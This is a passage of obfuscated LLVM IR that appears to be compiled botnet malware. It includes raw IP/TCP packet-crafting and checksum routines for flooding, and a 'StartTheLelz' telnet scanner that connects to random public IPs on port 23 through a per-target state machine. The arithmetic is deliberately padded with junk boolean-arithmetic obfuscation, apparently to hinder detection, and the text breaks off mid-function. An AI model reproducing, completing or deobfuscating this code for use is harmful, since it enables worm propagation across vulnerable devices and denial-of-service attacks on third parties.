declare i32 @rand() #4

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomIP(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %5 = call i32 @ntohl(i32 %4) #13
  %6 = load i32, i32* %2, align 4
  %7 = xor i32 %6, -1
  %8 = xor i32 %5, %7
  %9 = and i32 %8, %5
  %10 = and i32 %5, %6
  store i32 %9, i32* %3, align 4
  %11 = load i32, i32* %3, align 4
  %12 = call i32 @rand_cmwc()
  %13 = load i32, i32* %2, align 4
  %14 = xor i32 %13, -1
  %15 = and i32 462539642, %14
  %16 = xor i32 462539642, -1
  %17 = and i32 %13, %16
  %18 = xor i32 -1, -1
  %19 = and i32 %18, 462539642
  %20 = and i32 -1, %16
  %21 = or i32 %15, %17
  %22 = or i32 %19, %20
  %23 = xor i32 %21, %22
  %24 = xor i32 %13, -1
  %25 = xor i32 %23, -1
  %26 = xor i32 %12, %25
  %27 = and i32 %26, %12
  %28 = and i32 %12, %23
  %29 = xor i32 %11, -1
  %30 = and i32 -114606187, %29
  %31 = xor i32 -114606187, -1
  %32 = and i32 %11, %31
  %33 = xor i32 %27, -1
  %34 = and i32 %33, -114606187
  %35 = and i32 %27, %31
  %36 = or i32 %30, %32
  %37 = or i32 %34, %35
  %38 = xor i32 %36, %37
  %39 = xor i32 %11, %27
  ret i32 %38
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #8

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @csum(i16*, i32) #0 {
  %3 = alloca i16*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  store i16* %0, i16** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  br label %6

; <label>:6:                                      ; preds = %9, %2
  %7 = load i32, i32* %4, align 4
  %8 = icmp sgt i32 %7, 1
  br i1 %8, label %9, label %24

; <label>:9:                                      ; preds = %6
  %10 = load i16*, i16** %3, align 8
  %11 = getelementptr inbounds i16, i16* %10, i32 1
  store i16* %11, i16** %3, align 8
  %12 = load i16, i16* %10, align 2
  %13 = zext i16 %12 to i64
  %14 = load i64, i64* %5, align 8
  %15 = sub i64 %14, -3451228298651607470
  %16 = add i64 %15, %13
  %17 = add i64 %16, -3451228298651607470
  %18 = add i64 %14, %13
  store i64 %17, i64* %5, align 8
  %19 = load i32, i32* %4, align 4
  %20 = add i32 %19, 10028609
  %21 = sub i32 %20, 2
  %22 = sub i32 %21, 10028609
  %23 = sub nsw i32 %19, 2
  store i32 %22, i32* %4, align 4
  br label %6

; <label>:24:                                     ; preds = %6
  %25 = load i32, i32* %4, align 4
  %26 = icmp sgt i32 %25, 0
  br i1 %26, label %27, label %36

; <label>:27:                                     ; preds = %24
  %28 = load i16*, i16** %3, align 8
  %29 = bitcast i16* %28 to i8*
  %30 = load i8, i8* %29, align 1
  %31 = zext i8 %30 to i64
  %32 = load i64, i64* %5, align 8
  %33 = sub i64 0, %31
  %34 = sub i64 %32, %33
  %35 = add i64 %32, %31
  store i64 %34, i64* %5, align 8
  br label %36

; <label>:36:                                     ; preds = %27, %24
  br label %37

; <label>:37:                                     ; preds = %41, %36
  %38 = load i64, i64* %5, align 8
  %39 = lshr i64 %38, 16
  %40 = icmp ne i64 %39, 0
  br i1 %40, label %41, label %56

; <label>:41:                                     ; preds = %37
  %42 = load i64, i64* %5, align 8
  %43 = xor i64 %42, -1
  %44 = xor i64 65535, -1
  %45 = xor i64 4880484518916793814, -1
  %46 = or i64 %43, %44
  %47 = or i64 4880484518916793814, %45
  %48 = xor i64 %46, -1
  %49 = and i64 %48, %47
  %50 = and i64 %42, 65535
  %51 = load i64, i64* %5, align 8
  %52 = lshr i64 %51, 16
  %53 = sub i64 0, %52
  %54 = sub i64 %49, %53
  %55 = add i64 %49, %52
  store i64 %54, i64* %5, align 8
  br label %37

; <label>:56:                                     ; preds = %37
  %57 = load i64, i64* %5, align 8
  %58 = xor i64 %57, -1
  %59 = and i64 -182091825100779447, %58
  %60 = xor i64 -182091825100779447, -1
  %61 = and i64 %57, %60
  %62 = xor i64 -1, -1
  %63 = and i64 %62, -182091825100779447
  %64 = and i64 -1, %60
  %65 = or i64 %59, %61
  %66 = or i64 %63, %64
  %67 = xor i64 %65, %66
  %68 = xor i64 %57, -1
  %69 = trunc i64 %67 to i16
  ret i16 %69
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @tcpcsum(%struct.iphdr*, %struct.tcphdr*) #0 {
  %3 = alloca %struct.iphdr*, align 8
  %4 = alloca %struct.tcphdr*, align 8
  %5 = alloca %struct.tcp_pseudo, align 8
  %6 = alloca i16, align 2
  %7 = alloca i32, align 4
  %8 = alloca i16*, align 8
  %9 = alloca i16, align 2
  store %struct.iphdr* %0, %struct.iphdr** %3, align 8
  store %struct.tcphdr* %1, %struct.tcphdr** %4, align 8
  %10 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %11 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %10, i32 0, i32 2
  %12 = load i16, i16* %11, align 2
  store i16 %12, i16* %6, align 2
  %13 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %14 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %13, i32 0, i32 8
  %15 = load i32, i32* %14, align 4
  %16 = zext i32 %15 to i64
  %17 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 0
  store i64 %16, i64* %17, align 8
  %18 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %19 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %18, i32 0, i32 9
  %20 = load i32, i32* %19, align 4
  %21 = zext i32 %20 to i64
  %22 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 1
  store i64 %21, i64* %22, align 8
  %23 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 2
  store i8 0, i8* %23, align 8
  %24 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 3
  store i8 6, i8* %24, align 1
  %25 = call zeroext i16 @htons(i16 zeroext 20) #13
  %26 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 4
  store i16 %25, i16* %26, align 2
  store i32 44, i32* %7, align 4
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = call noalias i8* @malloc(i64 %28) #2
  %30 = bitcast i8* %29 to i16*
  store i16* %30, i16** %8, align 8
  %31 = load i16*, i16** %8, align 8
  %32 = bitcast i16* %31 to i8*
  %33 = bitcast %struct.tcp_pseudo* %5 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %32, i8* %33, i64 24, i32 1, i1 false)
  %34 = load i16*, i16** %8, align 8
  %35 = bitcast i16* %34 to i8*
  %36 = getelementptr inbounds i8, i8* %35, i64 24
  %37 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %38 = bitcast %struct.tcphdr* %37 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %36, i8* %38, i64 20, i32 1, i1 false)
  %39 = load i16*, i16** %8, align 8
  %40 = load i32, i32* %7, align 4
  %41 = call zeroext i16 @csum(i16* %39, i32 %40)
  store i16 %41, i16* %9, align 2
  %42 = load i16*, i16** %8, align 8
  %43 = bitcast i16* %42 to i8*
  call void @free(i8* %43) #2
  %44 = load i16, i16* %9, align 2
  ret i16 %44
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #5

; Function Attrs: noinline nounwind uwtable
define void @makeIPPacket(%struct.iphdr*, i32, i32, i8 zeroext, i32) #0 {
  %6 = alloca %struct.iphdr*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8, align 1
  %10 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %6, align 8
  store i32 %1, i32* %7, align 4
  store i32 %2, i32* %8, align 4
  store i8 %3, i8* %9, align 1
  store i32 %4, i32* %10, align 4
  %11 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %12 = bitcast %struct.iphdr* %11 to i8*
  %13 = load i8, i8* %12, align 4
  %14 = xor i8 -16, -1
  %15 = xor i8 %13, %14
  %16 = and i8 %15, %13
  %17 = and i8 %13, -16
  %18 = and i8 %16, 5
  %19 = xor i8 %16, 5
  %20 = or i8 %18, %19
  %21 = or i8 %16, 5
  store i8 %20, i8* %12, align 4
  %22 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %23 = bitcast %struct.iphdr* %22 to i8*
  %24 = load i8, i8* %23, align 4
  %25 = xor i8 15, -1
  %26 = xor i8 %24, %25
  %27 = and i8 %26, %24
  %28 = and i8 %24, 15
  %29 = and i8 %27, 64
  %30 = xor i8 %27, 64
  %31 = or i8 %29, %30
  %32 = or i8 %27, 64
  store i8 %31, i8* %23, align 4
  %33 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %34 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %33, i32 0, i32 1
  store i8 0, i8* %34, align 1
  %35 = load i32, i32* %10, align 4
  %36 = sext i32 %35 to i64
  %37 = add i64 20, -3045753959845331207
  %38 = add i64 %37, %36
  %39 = sub i64 %38, -3045753959845331207
  %40 = add i64 20, %36
  %41 = trunc i64 %39 to i16
  %42 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %43 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %42, i32 0, i32 2
  store i16 %41, i16* %43, align 2
  %44 = call i32 @rand_cmwc()
  %45 = trunc i32 %44 to i16
  %46 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %47 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %46, i32 0, i32 3
  store i16 %45, i16* %47, align 4
  %48 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %49 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %48, i32 0, i32 4
  store i16 0, i16* %49, align 2
  %50 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %51 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %50, i32 0, i32 5
  store i8 -1, i8* %51, align 4
  %52 = load i8, i8* %9, align 1
  %53 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %54 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %53, i32 0, i32 6
  store i8 %52, i8* %54, align 1
  %55 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %56 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %55, i32 0, i32 7
  store i16 0, i16* %56, align 2
  %57 = load i32, i32* %8, align 4
  %58 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %59 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %58, i32 0, i32 8
  store i32 %57, i32* %59, align 4
  %60 = load i32, i32* %7, align 4
  %61 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %62 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %61, i32 0, i32 9
  store i32 %60, i32* %62, align 4
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @sclose(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %4 = load i32, i32* %3, align 4
  %5 = icmp sgt i32 3, %4
  br i1 %5, label %6, label %7

; <label>:6:                                      ; preds = %1
  store i32 1, i32* %2, align 4
  br label %10

; <label>:7:                                      ; preds = %1
  %8 = load i32, i32* %3, align 4
  %9 = call i32 @close(i32 %8)
  store i32 0, i32* %2, align 4
  br label %10

; <label>:10:                                     ; preds = %7, %6
  %11 = load i32, i32* %2, align 4
  ret i32 %11
}

; Function Attrs: noinline nounwind uwtable
define void @StartTheLelz() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca %struct.__sigset_t, align 8
  %5 = alloca %struct.timeval, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca %struct.sockaddr_in, align 4
  %9 = alloca i8*, align 8
  %10 = alloca %struct.timeval, align 8
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = call i32 @getdtablesize() #2
  %15 = sdiv i32 %14, 4
  %16 = mul nsw i32 %15, 3
  store i32 %16, i32* %1, align 4
  %17 = load i32, i32* %1, align 4
  %18 = icmp sgt i32 %17, 512
  br i1 %18, label %19, label %20

; <label>:19:                                     ; preds = %0
  br label %22

; <label>:20:                                     ; preds = %0
  %21 = load i32, i32* %1, align 4
  br label %22

; <label>:22:                                     ; preds = %20, %19
  %23 = phi i32 [ 512, %19 ], [ %21, %20 ]
  store i32 %23, i32* %1, align 4
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 0
  store i16 2, i16* %24, align 4
  %25 = call zeroext i16 @htons(i16 zeroext 23) #13
  %26 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 1
  store i16 %25, i16* %26, align 2
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 3
  %28 = getelementptr inbounds [8 x i8], [8 x i8]* %27, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %28, i8 0, i64 8, i32 4, i1 false)
  %29 = load i32, i32* %1, align 4
  %30 = zext i32 %29 to i64
  %31 = call i8* @llvm.stacksave()
  store i8* %31, i8** %9, align 8
  %32 = alloca %struct.telstate_t, i64 %30, align 16
  %33 = bitcast %struct.telstate_t* %32 to i8*
  %34 = load i32, i32* %1, align 4
  %35 = sext i32 %34 to i64
  %36 = mul i64 %35, 5
  call void @llvm.memset.p0i8.i64(i8* %33, i8 0, i64 %36, i32 16, i1 false)
  store i32 0, i32* %2, align 4
  br label %37

; <label>:37:                                     ; preds = %56, %22
  %38 = load i32, i32* %2, align 4
  %39 = load i32, i32* %1, align 4
  %40 = icmp slt i32 %38, %39
  br i1 %40, label %41, label %63

; <label>:41:                                     ; preds = %37
  %42 = load i32, i32* %2, align 4
  %43 = sext i32 %42 to i64
  %44 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %43
  %45 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i32 0, i32 3
  store i8 1, i8* %45, align 1
  %46 = call noalias i8* @malloc(i64 1024) #2
  %47 = load i32, i32* %2, align 4
  %48 = sext i32 %47 to i64
  %49 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %48
  %50 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i32 0, i32 8
  store i8* %46, i8** %50, align 8
  %51 = load i32, i32* %2, align 4
  %52 = sext i32 %51 to i64
  %53 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %52
  %54 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %53, i32 0, i32 8
  %55 = load i8*, i8** %54, align 8
  call void @llvm.memset.p0i8.i64(i8* %55, i8 0, i64 1024, i32 1, i1 false)
  br label %56

; <label>:56:                                     ; preds = %41
  %57 = load i32, i32* %2, align 4
  %58 = sub i32 0, %57
  %59 = sub i32 0, 1
  %60 = add i32 %58, %59
  %61 = sub i32 0, %60
  %62 = add nsw i32 %57, 1
  store i32 %61, i32* %2, align 4
  br label %37

; <label>:63:                                     ; preds = %37
  %64 = getelementptr inbounds %struct.timeval, %struct.timeval* %10, i32 0, i32 0
  store i64 5, i64* %64, align 8
  %65 = getelementptr inbounds %struct.timeval, %struct.timeval* %10, i32 0, i32 1
  store i64 0, i64* %65, align 8
  br label %66

; <label>:66:                                     ; preds = %1129, %63
  br label %67

; <label>:67:                                     ; preds = %66
  store i32 0, i32* %2, align 4
  br label %68

; <label>:68:                                     ; preds = %1122, %67
  %69 = load i32, i32* %2, align 4
  %70 = load i32, i32* %1, align 4
  %71 = icmp slt i32 %69, %70
  br i1 %71, label %72, label %1129

; <label>:72:                                     ; preds = %68
  %73 = load i32, i32* %2, align 4
  %74 = sext i32 %73 to i64
  %75 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %74
  %76 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %75, i32 0, i32 2
  %77 = load i8, i8* %76, align 8
  %78 = zext i8 %77 to i32
  switch i32 %78, label %1121 [
    i32 0, label %79
    i32 1, label %256
    i32 2, label %422
    i32 3, label %600
    i32 4, label %668
    i32 5, label %807
    i32 6, label %875
    i32 7, label %1022
    i32 8, label %1050
  ]

; <label>:79:                                     ; preds = %72
  %80 = load i32, i32* %2, align 4
  %81 = sext i32 %80 to i64
  %82 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %81
  %83 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %82, i32 0, i32 8
  %84 = load i8*, i8** %83, align 8
  call void @llvm.memset.p0i8.i64(i8* %84, i8 0, i64 1024, i32 1, i1 false)
  %85 = load i32, i32* %2, align 4
  %86 = sext i32 %85 to i64
  %87 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %86
  %88 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %87, i32 0, i32 3
  %89 = load i8, i8* %88, align 1
  %90 = icmp ne i8 %89, 0
  br i1 %90, label %91, label %111

; <label>:91:                                     ; preds = %79
  %92 = load i32, i32* %2, align 4
  %93 = sext i32 %92 to i64
  %94 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %93
  %95 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %94, i32 0, i32 8
  %96 = load i8*, i8** %95, align 8
  store i8* %96, i8** %11, align 8
  %97 = load i32, i32* %2, align 4
  %98 = sext i32 %97 to i64
  %99 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %98
  %100 = bitcast %struct.telstate_t* %99 to i8*
  call void @llvm.memset.p0i8.i64(i8* %100, i8 0, i64 32, i32 16, i1 false)
  %101 = load i8*, i8** %11, align 8
  %102 = load i32, i32* %2, align 4
  %103 = sext i32 %102 to i64
  %104 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %103
  %105 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %104, i32 0, i32 8
  store i8* %101, i8** %105, align 8
  %106 = call i32 @getRandomPublicIP()
  %107 = load i32, i32* %2, align 4
  %108 = sext i32 %107 to i64
  %109 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %108
  %110 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %109, i32 0, i32 1
  store i32 %106, i32* %110, align 4
  br label %155

; <label>:111:                                    ; preds = %79
  %112 = load i32, i32* %2, align 4
  %113 = sext i32 %112 to i64
  %114 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %113
  %115 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %114, i32 0, i32 5
  %116 = load i8, i8* %115, align 1
  %117 = add i8 %116, 106
  %118 = add i8 %117, 1
  %119 = sub i8 %118, 106
  %120 = add i8 %116, 1
  store i8 %119, i8* %115, align 1
  %121 = load i32, i32* %2, align 4
  %122 = sext i32 %121 to i64
  %123 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %122
  %124 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %123, i32 0, i32 5
  %125 = load i8, i8* %124, align 1
  %126 = zext i8 %125 to i64
  %127 = icmp eq i64 %126, 14
  br i1 %127, label %128, label %141

; <label>:128:                                    ; preds = %111
  %129 = load i32, i32* %2, align 4
  %130 = sext i32 %129 to i64
  %131 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %130
  %132 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %131, i32 0, i32 5
  store i8 0, i8* %132, align 1
  %133 = load i32, i32* %2, align 4
  %134 = sext i32 %133 to i64
  %135 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %134
  %136 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %135, i32 0, i32 4
  %137 = load i8, i8* %136, align 2
  %138 = sub i8 0, 1
  %139 = sub i8 %137, %138
  %140 = add i8 %137, 1
  store i8 %139, i8* %136, align 2
  br label %141

; <label>:141:                                    ; preds = %128, %111
  %142 = load i32, i32* %2, align 4
  %143 = sext i32 %142 to i64
  %144 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %143
  %145 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %144, i32 0, i32 4
  %146 = load i8, i8* %145, align 2
  %147 = zext i8 %146 to i64
  %148 = icmp eq i64 %147, 6
  br i1 %148, label %149, label %154

; <label>:149:                                    ; preds = %141
  %150 = load i32, i32* %2, align 4
  %151 = sext i32 %150 to i64
  %152 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %151
  %153 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %152, i32 0, i32 3
  store i8 1, i8* %153, align 1
  br label %1122

; <label>:154:                                    ; preds = %141
  br label %155

; <label>:155:                                    ; preds = %154, %91
  %156 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 0
  store i16 2, i16* %156, align 4
  %157 = call zeroext i16 @htons(i16 zeroext 23) #13
  %158 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 1
  store i16 %157, i16* %158, align 2
  %159 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 3
  %160 = getelementptr inbounds [8 x i8], [8 x i8]* %159, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %160, i8 0, i64 8, i32 4, i1 false)
  %161 = load i32, i32* %2, align 4
  %162 = sext i32 %161 to i64
  %163 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %162
  %164 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %163, i32 0, i32 1
  %165 = load i32, i32* %164, align 4
  %166 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 2
  %167 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %166, i32 0, i32 0
  store i32 %165, i32* %167, align 4
  %168 = call i32 @socket(i32 2, i32 1, i32 0) #2
  %169 = load i32, i32* %2, align 4
  %170 = sext i32 %169 to i64
  %171 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %170
  %172 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %171, i32 0, i32 0
  store i32 %168, i32* %172, align 16
  %173 = load i32, i32* %2, align 4
  %174 = sext i32 %173 to i64
  %175 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %174
  %176 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %175, i32 0, i32 0
  %177 = load i32, i32* %176, align 16
  %178 = bitcast %struct.timeval* %10 to i8*
  %179 = call i32 @setsockopt(i32 %177, i32 1, i32 20, i8* %178, i32 16) #2
  %180 = load i32, i32* %2, align 4
  %181 = sext i32 %180 to i64
  %182 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %181
  %183 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %182, i32 0, i32 0
  %184 = load i32, i32* %183, align 16
  %185 = bitcast %struct.timeval* %10 to i8*
  %186 = call i32 @setsockopt(i32 %184, i32 1, i32 21, i8* %185, i32 16) #2
  %187 = load i32, i32* %2, align 4
  %188 = sext i32 %187 to i64
  %189 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %188
  %190 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %189, i32 0, i32 0
  %191 = load i32, i32* %190, align 16
  %192 = icmp eq i32 %191, -1
  br i1 %192, label %193, label %194

; <label>:193:                                    ; preds = %155
  br label %1122

; <label>:194:                                    ; preds = %155
  %195 = load i32, i32* %2, align 4
  %196 = sext i32 %195 to i64
  %197 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %196
  %198 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %197, i32 0, i32 0
  %199 = load i32, i32* %198, align 16
  %200 = load i32, i32* %2, align 4
  %201 = sext i32 %200 to i64
  %202 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %201
  %203 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %202, i32 0, i32 0
  %204 = load i32, i32* %203, align 16
  %205 = call i32 (i32, i32, ...) @fcntl(i32 %204, i32 3, i8* null)
  %206 = xor i32 %205, -1
  %207 = xor i32 2048, -1
  %208 = xor i32 681633397, -1
  %209 = and i32 %206, 681633397
  %210 = and i32 %205, %208
  %211 = and i32 %207, 681633397
  %212 = and i32 2048, %208
  %213 = or i32 %209, %210
  %214 = or i32 %211, %212
  %215 = xor i32 %213, %214
  %216 = or i32 %206, %207
  %217 = xor i32 %216, -1
  %218 = or i32 681633397, %208
  %219 = and i32 %217, %218
  %220 = or i32 %215, %219
  %221 = or i32 %205, 2048
  %222 = call i32 (i32, i32, ...) @fcntl(i32 %199, i32 4, i32 %220)
  %223 = load i32, i32* %2, align 4
  %224 = sext i32 %223 to i64
  %225 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %224
  %226 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %225, i32 0, i32 0
  %227 = load i32, i32* %226, align 16
  %228 = bitcast %struct.sockaddr_in* %8 to %struct.sockaddr*
  %229 = call i32 @connect(i32 %227, %struct.sockaddr* %228, i32 16)
  %230 = icmp eq i32 %229, -1
  br i1 %230, label %231, label %246

; <label>:231:                                    ; preds = %194
  %232 = call i32* @__errno_location() #13
  %233 = load i32, i32* %232, align 4
  %234 = icmp ne i32 %233, 115
  br i1 %234, label %235, label %246

; <label>:235:                                    ; preds = %231
  %236 = load i32, i32* %2, align 4
  %237 = sext i32 %236 to i64
  %238 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %237
  %239 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %238, i32 0, i32 0
  %240 = load i32, i32* %239, align 16
  %241 = call i32 @sclose(i32 %240)
  %242 = load i32, i32* %2, align 4
  %243 = sext i32 %242 to i64
  %244 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %243
  %245 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %244, i32 0, i32 3
  store i8 1, i8* %245, align 1
  br label %255

; <label>:246:                                    ; preds = %231, %194
  %247 = load i32, i32* %2, align 4
  %248 = sext i32 %247 to i64
  %249 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %248
  %250 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %249, i32 0, i32 2
  store i8 1, i8* %250, align 8
  %251 = load i32, i32* %2, align 4
  %252 = sext i32 %251 to i64
  %253 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %252
  %254 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %253, i32 0, i32 6
  store i32 0, i32* %254, align 4
  br label %255

; <label>:255:                                    ; preds = %246, %235
  br label %1121

; <label>:256:                                    ; preds = %72
  %257 = load i32, i32* %2, align 4
  %258 = sext i32 %257 to i64
  %259 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %258
  %260 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %259, i32 0, i32 6
  %261 = load i32, i32* %260, align 4
  %262 = icmp eq i32 %261, 0
  br i1 %262, label %263, label %269

; <label>:263:                                    ; preds = %256
  %264 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %265 = load i32, i32* %2, align 4
  %266 = sext i32 %265 to i64
  %267 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %266
  %268 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %267, i32 0, i32 6
  store i32 %264, i32* %268, align 4
  br label %269

; <label>:269:                                    ; preds = %263, %256
  br label %270

; <label>:270:                                    ; preds = %269
  %271 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %4, i32 0, i32 0
  %272 = getelementptr inbounds [16 x i64], [16 x i64]* %271, i64 0, i64 0
  %273 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %272) #2, !srcloc !5
  %274 = extractvalue { i64, i64* } %273, 0
  %275 = extractvalue { i64, i64* } %273, 1
  %276 = trunc i64 %274 to i32
  store i32 %276, i32* %12, align 4
  %277 = ptrtoint i64* %275 to i64
  %278 = trunc i64 %277 to i32
  store i32 %278, i32* %13, align 4
  br label %279

; <label>:279:                                    ; preds = %270
  br label %280

; <label>:280:                                    ; preds = %279
  %281 = load i32, i32* %2, align 4
  %282 = sext i32 %281 to i64
  %283 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %282
  %284 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %283, i32 0, i32 0
  %285 = load i32, i32* %284, align 16
  %286 = srem i32 %285, 64
  %287 = zext i32 %286 to i64
  %288 = shl i64 1, %287
  %289 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %4, i32 0, i32 0
  %290 = load i32, i32* %2, align 4
  %291 = sext i32 %290 to i64
  %292 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %291
  %293 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %292, i32 0, i32 0
